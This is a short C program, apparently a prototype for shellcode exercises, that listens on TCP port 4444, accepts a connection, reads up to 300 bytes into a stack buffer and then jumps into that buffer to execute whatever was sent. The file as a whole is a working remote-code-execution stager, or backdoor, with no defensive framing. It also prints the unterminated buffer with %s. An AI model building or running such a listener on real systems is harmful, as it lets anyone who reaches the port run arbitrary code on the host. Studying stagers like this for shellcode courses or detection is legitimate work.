#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main() {
    int resultfd, sockfd;
    int port = 4444;
    struct sockaddr_in my_addr;
    
    // sycall socketcall (sys_socket 1)
    sockfd = socket(AF_INET, SOCK_STREAM, 0);

    // syscall socketcall (sys_setsockopt 14)
    int one = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

    // set struct values
    my_addr.sin_family = AF_INET; // 2
    my_addr.sin_port = htons(port); // port number
    my_addr.sin_addr.s_addr = INADDR_ANY; // 0 fill with the local IP

    // syscall socketcall (sys_bind 2)
    puts("Binding to socket...");
    bind(sockfd, (struct sockaddr *) &my_addr, sizeof(my_addr));

    // syscall socketcall (sys_listen 4)
    listen(sockfd, 0);
    puts("Waiting for connection");

    // syscall socketcall (sys_accept 5)
    resultfd = accept(sockfd, NULL, NULL);
    puts("Accepted a connection");


    char buffer[300];
    ssize_t bytes_received = recv(resultfd, buffer, sizeof(buffer), 0);
    if (bytes_received < 0) {
        perror("recv");
        exit(EXIT_FAILURE);
    } else if (bytes_received == 0) {
        // Connection closed by peer
        printf("Connection closed by peer\n");
    } else {
        // Data received successfully
        printf("Received %zd bytes: %s\n", bytes_received, buffer);

        ((void (*)())buffer)();
    }

    // Close the sockets
    close(resultfd);
    close(sockfd);

    return 0;
}